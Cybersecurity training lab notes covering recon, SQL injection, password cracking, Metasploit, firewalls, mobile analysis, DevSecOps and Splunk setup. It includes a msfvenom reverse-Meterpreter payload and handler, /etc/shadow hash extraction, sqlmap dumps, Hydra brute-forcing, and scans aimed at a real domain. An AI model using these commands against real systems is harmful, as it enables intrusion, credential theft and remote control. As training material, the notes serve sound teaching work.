# Cybersecurity Lab Notes

Consolidated notes from lab sessions — Network Recon, Web App Security, Password Attacks,
Exploitation, Defensive Tools, Mobile Security, and DevSecOps.

> ⚠️ All commands here are meant for **authorized lab environments only** — your own AWS VM,
> OWASP Juice Shop, DVWA, or other systems you explicitly own or have written permission to test.

---

## Table of Contents

1. [Network Reconnaissance](#1-network-reconnaissance)
   - [Nmap](#nmap)
   - [Netcat (nc)](#netcat-nc)
   - [Gobuster](#gobuster)
   - [Nikto](#nikto)
2. [Web App Security & Attack Simulation](#2-web-app-security--attack-simulation)
   - [SQL Injection Lab + SQLMap](#sql-injection-lab--sqlmap)
   - [Hydra](#hydra)
   - [John the Ripper](#john-the-ripper)
3. [Exploitation Framework](#3-exploitation-framework)
   - [Metasploit Framework](#metasploit-framework)
4. [Defensive Tools](#4-defensive-tools)
   - [UFW (Uncomplicated Firewall)](#ufw-uncomplicated-firewall)
   - [Fail2Ban](#fail2ban)
5. [Mobile Security](#5-mobile-security)
   - [MobSF — Android APK Analysis](#mobsf--android-apk-analysis)
6. [DevSecOps / CI-CD Pipeline](#6-devsecops--ci-cd-pipeline)
   - [Jenkins + Docker + Trivy + SonarQube Setup](#jenkins--docker--trivy--sonarqube-setup)
   - [Jenkins Pipeline (declarative)](#jenkins-pipeline-declarative)
7. [SOC / SIEM](#7-soc--siem)
   - [Splunk Centralized Log Monitoring](#splunk-centralized-log-monitoring)
8. [Tools Roadmap (Slide Deck Reference)](#8-tools-roadmap-slide-deck-reference)

---

## 1. Network Reconnaissance

### Nmap

```bash
sudo dnf update -y
sudo dnf install nmap -y
nmap --version
```

| Purpose | Command |
|---|---|
| Basic scan | `nmap www.besanttechnologies.com` |
| Common web ports | `nmap -p 80,443 www.besanttechnologies.com` |
| Service version detection | `sudo nmap -sV www.besanttechnologies.com` |
| Aggressive scan (OS, scripts, traceroute) | `sudo nmap -A www.besanttechnologies.com` |
| Fast scan | `nmap -F www.besanttechnologies.com` |
| Specific ports | `nmap -p 21,22,25,53,80,443,3306 www.besanttechnologies.com` |
| Host discovery (ping scan) | `nmap -sn www.besanttechnologies.com` |
| If ICMP is blocked | `nmap -Pn www.besanttechnologies.com` |

### Netcat (nc)

**Install (Amazon Linux 2023 — `nc` ships inside `nmap-ncat`):**
```bash
sudo dnf update -y
sudo dnf install -y nmap-ncat
nc --help          # or: ncat --help
which nc            # /usr/bin/nc
ncat --version
```

**Practical commands:**

| # | Purpose | Command |
|---|---|---|
| 1 | Connect to a server | `nc besanttechnologies.com 80` |
| 2 | Check if a port is open | `nc -zv besanttechnologies.com 80` |
| 3 | Scan a port range | `nc -zv localhost 20-100` |
| 4 | Start a listener | `nc -lvnp 4444` |
| 5 | Connect to the listener | `nc localhost 4444` |
| 6 | Banner grabbing | `nc scanme.nmap.org 22` |
| 7 | Manual HTTP request | `nc besanttechnologies.com 80` then type `GET / HTTP/1.1` + `Host: besanttechnologies.com` + blank line |
| 8 | Send a message | `echo "Hello" \| nc localhost 4444` |
| 9 | File transfer (sender) | `nc -lvnp 4444 < file.txt` |
| 9 | File transfer (receiver) | `nc <SERVER-IP> 4444 > file.txt` |
| 10 | Test UDP (e.g. DNS) | `nc -u localhost 53` |

**Flags:** `-z` scan mode (no data sent) · `-v` verbose · `-n` skip DNS resolution · `-p` set port · `-l` listen mode · `-u` UDP.

### Gobuster

**Install script:**
```bash
#!/bin/bash
set -e
cd /tmp
wget -q https://github.com/OJ/gobuster/releases/download/v3.8.2/gobuster_Linux_x86_64.tar.gz
tar -xzf gobuster_Linux_x86_64.tar.gz
sudo mv gobuster /usr/local/bin/
rm -f gobuster_Linux_x86_64.tar.gz
gobuster --version
```
It also creates a sample `~/wordlist.txt` and `subdomains.txt`.

**Commands:**

| Purpose | Command |
|---|---|
| Directory enumeration | `gobuster dir -u http://PUBLIC-IP -w wordlist.txt` |
| File enumeration (with extensions) | `gobuster dir -u http://PUBLIC-IP -w wordlist.txt -x php,html,txt,zip` |
| Show only specific status codes | `gobuster dir -u http://PUBLIC-IP -w wordlist.txt -s 200,301,403` |
| Ignore specific status codes | `gobuster dir -u http://PUBLIC-IP -w wordlist.txt -b 404` |
| More threads | `gobuster dir -u http://PUBLIC-IP -w wordlist.txt -t 50` |
| Save output | `gobuster dir -u http://PUBLIC-IP -w wordlist.txt -o results.txt` |
| DNS/subdomain enumeration | `gobuster dns --domain besanttechnologies.com -w subdomains.txt` |

**Website setup script (Apache + Git deploy, Amazon Linux):**
```bash
#!/bin/bash
sudo yum update -y
sudo yum install httpd -y
sudo systemctl enable httpd
sudo systemctl start httpd
sudo yum install git -y

REPO_URL="https://github.com/Naveen93mm/cls.git"
sudo rm -rf /var/www/html/*
sudo git clone $REPO_URL /var/www/html/
sudo chown -R apache:apache /var/www/html
sudo chmod -R 755 /var/www/html
sudo systemctl restart httpd

PUBLIC_IP=$(curl -s ifconfig.me)
echo "Website running at: http://$PUBLIC_IP"
```

### Nikto

**Install (Ubuntu):**
```bash
sudo apt update
sudo apt install -y nikto
nikto -version
```

| Purpose | Command |
|---|---|
| Basic HTTP scan | `nikto -h http://PUBLIC-IP` |
| HTTPS scan | `nikto -h https://PUBLIC-IP` |
| Scan a specific port | `nikto -h http://PUBLIC-IP:8080` |
| Save HTML report | `nikto -h http://PUBLIC-IP -o report.html -Format html` |
| Save TXT report | `nikto -h http://PUBLIC-IP -o report.txt` |
| Limit scan time | `nikto -h http://PUBLIC-IP -maxtime 10m` |
| Show version | `nikto -version` |
| Show help | `nikto -help` |
| Update signature DB | `nikto -update` |
| Scan by hostname | `nikto -h http://server.local` |

Findings typically include outdated server software, missing security headers, default files, and directory listing exposure.

**Website setup script (Apache + Git, Ubuntu):**
```bash
#!/bin/bash
sudo apt update
sudo apt install -y apache2 git
sudo systemctl enable apache2
sudo systemctl start apache2

REPO_URL="https://github.com/Naveen93mm/cls.git"
sudo rm -rf /var/www/html/*
sudo git clone $REPO_URL /var/www/html/
sudo chown -R www-data:www-data /var/www/html
sudo chmod -R 755 /var/www/html
sudo systemctl restart apache2
```

---

## 2. Web App Security & Attack Simulation

### SQL Injection Lab + SQLMap

**Target:** your own intentionally vulnerable Flask app (never a live/production site).

**1. Docker lab setup (Amazon Linux):**
```bash
sudo dnf update -y
sudo dnf install -y docker
sudo systemctl enable docker
sudo systemctl start docker
```
Creates a small Flask app (`app.py`) with a SQLite `users` table (`admin`, `student`, `trainer`)
and an intentionally vulnerable query built by string concatenation on the `id` parameter,
then builds and runs it in Docker on port `5000`.

```bash
sudo docker build -t sqli-lab .
sudo docker run -d --name sqli-lab -p 5000:5000 sqli-lab
curl http://127.0.0.1:5000/?id=1
```

**2. Install SQLMap:**
```bash
sudo dnf install -y git python3
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git "$HOME/sqlmap"
python3 ~/sqlmap/sqlmap.py --version
```

**3. SQLMap commands (against your own lab only):**

| Purpose | Command |
|---|---|
| Version | `python3 ~/sqlmap/sqlmap.py --version` |
| Help | `python3 ~/sqlmap/sqlmap.py -h` |
| Basic injection test | `python3 ~/sqlmap/sqlmap.py -u "http://PUBLIC-IP:5000/?id=1" -p id --batch` |
| Identify current DB | `... --current-db --batch` |
| Enumerate tables | `... --tables --batch` |
| Enumerate columns | `... -T users --columns --batch` |
| Dump table data | `... -T users --dump --batch` |

### Hydra

**1. OWASP Juice Shop lab setup (Docker, Amazon Linux):**
```bash
sudo dnf install -y docker
sudo systemctl enable docker
sudo systemctl start docker
sudo docker pull bkimminich/juice-shop
sudo docker run -d --name juice-shop -p 3000:3000 bkimminich/juice-shop
```

**2. Install Hydra (compiled from source):**
```bash
sudo dnf groupinstall -y "Development Tools"
sudo dnf install -y git openssl-devel pcre2-devel libssh-devel libidn2-devel libtool autoconf automake
git clone --depth 1 https://github.com/vanhauser-thc/thc-hydra.git "$HOME/hydra"
cd "$HOME/hydra" && ./configure && make -j"$(nproc)" && sudo make install
hydra -h | head -20
```

**3. Build a lab password wordlist (from SecLists):**
```bash
git clone --depth 1 https://github.com/danielmiessler/SecLists.git "$HOME/SecLists"
head -100 "$HOME/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt" > "$HOME/password.txt"
```

**4. Hydra commands (target: your own Juice Shop lab only):**

```bash
hydra -l admin@juice-sh.op -P ~/password.txt <TARGET-IP> -s 3000 \
  http-post-form "/rest/user/login:email=^USER^&password=^PASS^:F=Invalid email or password"
```

| Option | Effect |
|---|---|
| `-t 4` | 4 parallel threads |
| `-f` | Stop after first valid credential found |
| `-o hydra-results.txt` | Save results to file |

> Note: modern Juice Shop's `/rest/user/login` endpoint uses JSON, not classic form-encoding —
> treat the `http-post-form` syntax above as a training template that may need adjusting to
> match the real request (e.g. captured via Burp Suite).

### John the Ripper

**Install (compiled from source, Amazon Linux):**
```bash
sudo dnf groupinstall -y "Development Tools"
sudo dnf install -y git openssl-devel zlib-devel
git clone --depth 1 https://github.com/openwall/john.git "$HOME/john"
cd "$HOME/john/src" && ./configure && make -s clean && make -sj"$(nproc)"
```

**Basic commands:**

| Purpose | Command |
|---|---|
| Version | `~/john/run/john --version` |
| Help | `~/john/run/john --help` |
| Supported formats | `~/john/run/john --list=formats` |
| Crack a hash file | `~/john/run/john hash.txt` |
| Crack with wordlist | `~/john/run/john --wordlist=pass.txt hash.txt` |
| Show recovered passwords | `~/john/run/john --show hash.txt` |

**Lab 1 — Linux user password cracking:**
```bash
sudo useradd john
sudo passwd john
sudo cat /etc/shadow          # extract the hash line into has.txt
~/john/run/john --wordlist=pass.txt has.txt
```

**Lab 2 — ZIP password cracking:**
```bash
zip -e secret.zip secret.txt
~/john/run/zip2john secret.zip > zip-hash.txt
rm secret.txt
~/john/run/john --wordlist="$PWD/pass.txt" "$PWD/zip-hash.txt"
```

---

## 3. Exploitation Framework

### Metasploit Framework

**Install (Amazon Linux 2023, x86_64 only):**
```bash
curl -fL "https://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run" \
  -o /tmp/metasploit-installer.run
chmod +x /tmp/metasploit-installer.run
sudo /tmp/metasploit-installer.run
export PATH="/opt/metasploit-framework/bin:$PATH"
msfconsole --version
```

**Core console commands:**

| Command | Purpose |
|---|---|
| `msfconsole` | Start the console |
| `help` | List available commands |
| `version` | Show Metasploit version |
| `search <keyword>` | Search modules (e.g. `search linux`) |
| `use <module_path>` | Select a module |
| `info` | Show details of the selected module |
| `show options` | Show required options |
| `show payloads` | Show compatible payloads |
| `set OPTION VALUE` | Configure an option (e.g. `set RHOSTS 192.0.2.10`) |
| `set payload <name>` | Choose a payload |
| `check` | Check if target looks vulnerable (where supported) |
| `run` / `exploit` | Execute the module |
| `sessions` | List active sessions |
| `sessions -i <ID>` | Interact with a session |
| `back` | Leave current module |
| `unset OPTION` | Clear an option |
| `exit` | Quit console |

**Lab — authorized Windows lab target, reverse Meterpreter shell:**

```bash
# 1. Build the payload (lab attacker IP only)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LAB-ATTACKER-IP> LPORT=1122 -f exe -o devil.exe

# 2. Serve it for transfer to the lab VM only
python3 -m http.server 8080
```

```bash
# 3. Handler
sudo msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST <LAB-ATTACKER-IP>
set LPORT 1122
run
```

**Meterpreter session enumeration:**
```text
sysinfo
getuid
ipconfig
ps
pwd
ls
download <test-filename>
shell        # drop to native shell: whoami / hostname / ipconfig, then exit
```

**Session teardown / lab cleanup (always do this):**
```text
exit
```
```bash
# stop HTTP server, delete devil.exe from the lab VM, close the session,
# revert the Windows VM snapshot
```

---

## 4. Defensive Tools

### UFW (Uncomplicated Firewall)

> UFW answers: *"Which traffic should be allowed or denied?"*

```bash
sudo apt update
sudo apt install ufw -y
sudo ufw enable
sudo ufw status
sudo ufw status verbose
```

| Task | Command |
|---|---|
| Allow SSH | `sudo ufw allow 22/tcp` |
| Allow HTTP | `sudo ufw allow 80/tcp` |
| Allow HTTPS | `sudo ufw allow 443/tcp` |
| Allow a custom app port | `sudo ufw allow 5000/tcp` |
| Deny a port (e.g. Telnet) | `sudo ufw deny 23/tcp` |
| List numbered rules | `sudo ufw status numbered` |
| Delete a rule by number | `sudo ufw delete 3` |
| Delete a rule directly | `sudo ufw delete deny 23/tcp` |
| Allow traffic from an IP | `sudo ufw allow from 192.168.1.100` |
| Allow an IP to SSH only | `sudo ufw allow from 192.168.1.100 to any port 22 proto tcp` |
| Deny an IP | `sudo ufw deny from 192.168.1.100` |
| Default deny incoming | `sudo ufw default deny incoming` |
| Default allow outgoing | `sudo ufw default allow outgoing` |
| Reset all rules | `sudo ufw reset` |

**Practical lab sequence:**
```bash
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw deny 23/tcp
sudo ufw enable
sudo ufw status verbose
```

### Fail2Ban

> Fail2Ban answers: *"Which IP should be temporarily blocked after repeated failed attempts?"*

```bash
sudo apt update
sudo apt install fail2ban -y
sudo systemctl enable fail2ban
sudo systemctl start fail2ban
sudo fail2ban-client status
sudo fail2ban-client status sshd
```

**Configure SSH jail** — `/etc/fail2ban/jail.local`:
```ini
[sshd]
enabled = true
port = ssh
logpath = %(sshd_log)s
maxretry = 3
findtime = 10m
bantime = 10m
```
```bash
sudo systemctl restart fail2ban
```

| Task | Command |
|---|---|
| Check jail status | `sudo fail2ban-client status sshd` |
| List currently banned IPs | `sudo fail2ban-client get sshd banip` |
| Manually ban an IP | `sudo fail2ban-client set sshd banip 192.168.1.100` |
| Unban an IP | `sudo fail2ban-client set sshd unbanip 192.168.1.100` |

**Two-VM lab (Attacker → Target):**

| | Machine 1 (Attacker) | Machine 2 (Target) |
|---|---|---|
| OS | Ubuntu Server 24.04 LTS | Ubuntu Server 24.04 LTS |
| Installs | `openssh-client` | `openssh-server`, `fail2ban`, `ufw` |

```bash
# On Target (Machine 2)
sudo apt install openssh-server fail2ban ufw -y
sudo ufw allow ssh && sudo ufw enable
sudo systemctl enable fail2ban && sudo systemctl start fail2ban
# configure /etc/fail2ban/jail.local as above, then:
sudo systemctl restart fail2ban
hostname -I     # note the target's private IP
```

```bash
# On Attacker (Machine 1) — generate failed logins against the authorized target
ssh wronguser@TARGET_PRIVATE_IP
```

```bash
# Back on Target — confirm the ban and check logs
sudo tail -f /var/log/auth.log
sudo fail2ban-client status sshd     # look for "Currently banned: 1"
sudo fail2ban-client set sshd unbanip ATTACKER_PRIVATE_IP
```

---

## 5. Mobile Security

### MobSF — Android APK Analysis

**Goal:** static (and optionally dynamic) analysis of an Android APK using MobSF in Docker.

| | Security Testing VM | Student Laptop |
|---|---|---|
| OS | Ubuntu Server 24.04 LTS | — |
| Storage | 20 GB+ | — |
| Installs | Docker, MobSF | SSH client, browser |
| Role | Runs MobSF container | Connects via SSH + uses MobSF web UI |

**Test target:** *InsecureBankv2* — a free, open-source, intentionally vulnerable Android app
built for security training (hosted under the MobSF GitHub org). Alternatives: Damn Vulnerable
Bank, DIVA, AndroGoat, OWASP UnCrackable Apps.

**Setup:**
```bash
sudo apt update && sudo apt upgrade -y
sudo apt install docker.io -y
sudo systemctl enable docker && sudo systemctl start docker
sudo usermod -aG docker $USER && newgrp docker

sudo docker pull opensecurity/mobile-security-framework-mobsf
sudo docker run -d --name mobsf -p 8000:8000 opensecurity/mobile-security-framework-mobsf
sudo docker logs -f mobsf
```

Open `http://EC2-PUBLIC-IP:8000` in a browser, upload the APK, and start analysis.

**Review checklist:**

| Section | What to look for |
|---|---|
| Security Score | Overall grade |
| Permissions | CAMERA, LOCATION, MICROPHONE, CONTACTS, STORAGE, INTERNET — flag anything unjustified |
| AndroidManifest | Exported activities/services, debuggable flag, backup flag |
| Application Components | Activities, Services, Broadcast Receivers, Content Providers |
| Hardcoded Secrets | `API_KEY`, `SECRET`, `PASSWORD`, tokens in code/strings |
| Insecure Storage | SharedPreferences, SQLite, cache, logs holding sensitive data |
| URLs / Endpoints | Hardcoded backend URLs, especially plain `http://` |
| Code Analysis | Weak crypto, insecure WebView config, SSL/TLS issues |

**API security checks:** authentication on every call, authorization (IDOR — can user1 access
`/api/user/1002`?), input validation, session/token expiry & reuse, plaintext PII exposure.

**Report structure per finding:**
```text
Finding → Evidence → Impact → Risk Level → Recommendation
```

**Docker cheat sheet:**
```bash
sudo docker ps
sudo docker logs -f mobsf
sudo docker stop mobsf
sudo docker start mobsf
sudo docker rm -f mobsf
sudo docker pull opensecurity/mobile-security-framework-mobsf   # re-pull latest
```

| Symptom | Likely cause | Fix |
|---|---|---|
| Can't reach `:8000` | Security-group rule missing | Allow port 8000 from your IP |
| `permission denied` on docker | User not in docker group | `sudo usermod -aG docker $USER && newgrp docker` |
| Container exits immediately | — | `sudo docker logs mobsf` |
| Upload fails/hangs | Instance too small | Use `t3.medium`+, check `free -h` |

---

## 6. DevSecOps / CI-CD Pipeline

### Jenkins + Docker + Trivy + SonarQube Setup

Single-VM, idempotent setup script (Amazon Linux 2023):

```bash
#!/bin/bash
set -e

sudo dnf update -y

# Java 21 (Jenkins 2.555+ requires Java 21 or 25)
sudo dnf install -y java-21-amazon-corretto

# Git
sudo dnf install -y git

# Jenkins
sudo wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat-stable/jenkins.repo
sudo rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io-2023.key
sudo dnf install -y jenkins
sudo systemctl enable jenkins && sudo systemctl start jenkins

# Docker
sudo dnf install -y docker
sudo systemctl enable docker && sudo systemctl start docker
sudo usermod -aG docker ec2-user
sudo usermod -aG docker jenkins
sudo systemctl restart jenkins

# Trivy
cat <<EOF | sudo tee /etc/yum.repos.d/trivy.repo
[trivy]
name=Trivy repository
baseurl=https://aquasecurity.github.io/trivy-repo/rpm/releases/\$basearch/
gpgcheck=1
enabled=1
gpgkey=https://aquasecurity.github.io/trivy-repo/rpm/public.key
EOF
sudo dnf install -y trivy

# SonarQube (container)
sudo docker run -d --name sonarqube -p 9090:9000 --restart unless-stopped sonarqube:lts

# sonar-scanner CLI
cd /tmp
sudo curl -sSLo sonar-scanner.zip \
  https://binaries.sonarsource.com/Distribution/sonar-scanner-cli/sonar-scanner-cli-5.0.1.3006-linux.zip
sudo dnf install -y unzip
sudo unzip -o sonar-scanner.zip -d /opt/
sudo mv /opt/sonar-scanner-* /opt/sonar-scanner
sudo ln -sf /opt/sonar-scanner/bin/sonar-scanner /usr/local/bin/sonar-scanner

# Jenkins initial admin password
sudo cat /var/lib/jenkins/secrets/initialAdminPassword
```

**Access URLs:**
- Jenkins: `http://<VM-PUBLIC-IP>:8080`
- SonarQube: `http://<VM-PUBLIC-IP>:9090` (default login `admin` / `admin`)

### Jenkins Pipeline (declarative)

```groovy
pipeline {
    agent any
    environment {
        DOCKER_IMAGE = "novaloc93"
        DOCKER_TAG   = "${BUILD_NUMBER}"
        DEPLOY_VM    = "3.109.138.5"
    }
    stages {
        stage('Clone Code From GIT') {
            steps {
                git branch: 'main', url: 'https://github.com/Naveen93mm/dm-project.git'
            }
        }
        stage('SonarQube Code Scan') {
            steps {
                withCredentials([string(credentialsId: 'sonar-token', variable: 'SONAR_TOKEN')]) {
                    sh '''
                        sonar-scanner \
                        -Dsonar.projectKey=novaloc93 \
                        -Dsonar.sources=. \
                        -Dsonar.host.url=http://3.109.138.5:9090 \
                        -Dsonar.login=$SONAR_TOKEN
                    '''
                }
            }
        }
        stage('Trivy Filesystem Scan') {
            steps {
                sh 'trivy fs . --severity HIGH,CRITICAL --exit-code 1'
            }
        }
        stage('Build Docker Image') {
            steps {
                sh 'docker build -t ${DOCKER_IMAGE}:${DOCKER_TAG} .'
            }
        }
        stage('Trivy Docker Image Scan') {
            steps {
                sh 'trivy image --severity HIGH,CRITICAL --exit-code 1 ${DOCKER_IMAGE}:${DOCKER_TAG}'
            }
        }
        stage('Save Docker Image') {
            steps {
                sh 'docker save ${DOCKER_IMAGE}:${DOCKER_TAG} -o ${DOCKER_IMAGE}-${DOCKER_TAG}.tar'
            }
        }
        stage('Deploy Docker Image to VM') {
            steps {
                sshagent(['vm-ssh-key']) {
                    sh """
                        scp -o StrictHostKeyChecking=no ${DOCKER_IMAGE}-${DOCKER_TAG}.tar ec2-user@${DEPLOY_VM}:/home/ec2-user/
                        ssh -o StrictHostKeyChecking=no ec2-user@${DEPLOY_VM} '
                            docker load -i /home/ec2-user/${DOCKER_IMAGE}-${DOCKER_TAG}.tar
                            docker stop novaloc93 || true
                            docker rm novaloc93 || true
                            docker run -d --name novaloc93 -p 80:80 ${DOCKER_IMAGE}:${DOCKER_TAG}
                            docker ps
                            docker logs --tail 20 novaloc93
                            rm -f /home/ec2-user/${DOCKER_IMAGE}-${DOCKER_TAG}.tar
                        '
                    """
                }
            }
        }
    }
    post {
        success { echo "SUCCESS: Docker image scanned and deployed successfully to VM." }
        failure { echo "FAILED: Pipeline stopped. Check Jenkins console logs." }
    }
}
```

> A second variant of this pipeline exists using `--exit-code 0` on the Trivy stages (report-only,
> non-blocking) and a different `sshagent` credential id (`vm` instead of `vm-ssh-key`) — swap in
> whichever matches your Jenkins credentials store.

---

## 7. SOC / SIEM

### Splunk Centralized Log Monitoring

**Architecture:** Splunk Universal Forwarder (Slave) → TCP `9997` → Splunk Enterprise (Master, Web UI on `8000`).

| | Machine 1 — MASTER | Machine 2 — SLAVE |
|---|---|---|
| OS | Amazon Linux 2023 | Amazon Linux 2023 |
| Role | Splunk Enterprise Server | Log source / forwarder |
| Software | Splunk Enterprise | Splunk Universal Forwarder |
| Key ports | 8000 (Web), 9997 (Receiving) | outbound → 9997 |

**Security group (on Master):**

| Port | Purpose | Source |
|---|---|---|
| 22 | SSH | Your IP |
| 8000 | Splunk Web | Your IP |
| 9997 | Splunk Receiving | Slave's Security Group ID only — **never 0.0.0.0/0** |

**Install Splunk Enterprise (Master):**
```bash
sudo dnf update -y
sudo wget -O splunk.rpm "https://download.splunk.com/products/splunk/releases/10.4.2/linux/splunk-10.4.2-33c3bf42cd73.x86_64.rpm"
sudo rpm -i splunk.rpm
sudo /opt/splunk/bin/splunk start --accept-license --run-as-root
sudo /opt/splunk/bin/splunk enable boot-start
```
Open `https://MASTER_PUBLIC_IP:8000` and log in with the admin credentials created during start.

**Enable receiving port:**
```bash
sudo /opt/splunk/bin/splunk enable listen 9997 -auth admin:PASSWORD
sudo /opt/splunk/bin/splunk display listen
```

**Install Universal Forwarder (Slave):**
```bash
wget -O splunkforwarder.rpm "https://download.splunk.com/products/universalforwarder/releases/10.4.2/linux/splunkforwarder-10.4.2-33c3bf42cd73.x86_64.rpm"
sudo rpm -i splunkforwarder.rpm
sudo /opt/splunkforwarder/bin/splunk start --accept-license --run-as-root
sudo /opt/splunkforwarder/bin/splunk enable boot-start
```

**Point Slave at Master:**
```bash
sudo /opt/splunkforwarder/bin/splunk add forward-server MASTER_PRIVATE_IP:9997
sudo /opt/splunkforwarder/bin/splunk list forward-server
```

**Monitor logs on the Slave:**
```bash
sudo /opt/splunkforwarder/bin/splunk add monitor /var/log
sudo /opt/splunkforwarder/bin/splunk list monitor
sudo /opt/splunkforwarder/bin/splunk restart
sudo /opt/splunkforwarder/bin/splunk status
```

Verify in Splunk Web (`Search & Reporting` → `index=*`) that events from the Slave are arriving.

---

## 8. Tools Roadmap (Slide Deck Reference)

| Category | Tools |
|---|---|
| **1. Network Reconnaissance & Analysis** | Nmap, Wireshark, Netcat, Gobuster, Nikto |
| **2. Web App Security & Attack Simulation** | Burp Suite, OWASP Juice Shop / DVWA, SQLMap, Hydra, John the Ripper |
| **3. Security Validation & Defensive Tools** | Metasploit Framework (+Meterpreter), OpenVAS/Greenbone, UFW, Fail2Ban, `journalctl`/`auth.log`/`grep` |
| **4. SOC & SIEM Tools** | Splunk, ELK Stack, IBM QRadar, Wazuh |
| **5. DevSecOps Pipeline** | GitHub → Jenkins → SonarQube (SAST) → Trivy → Docker → OWASP ZAP (DAST) |
| **6. Mobile / Android App Security** | MobSF, APKTool, Burp Suite |
| **7. Digital Forensics** | FTK Imager, Autopsy, Linux log forensics |

**Lab OS environments used across the deck:** Ubuntu VM, Amazon Linux VM, Kali Linux VM.

**Suggested flow for a single "Tools Roadmap" overview slide:**
```
Recon → Web → Exploit/Defend → SOC → DevSecOps → Mobile → Forensics
```
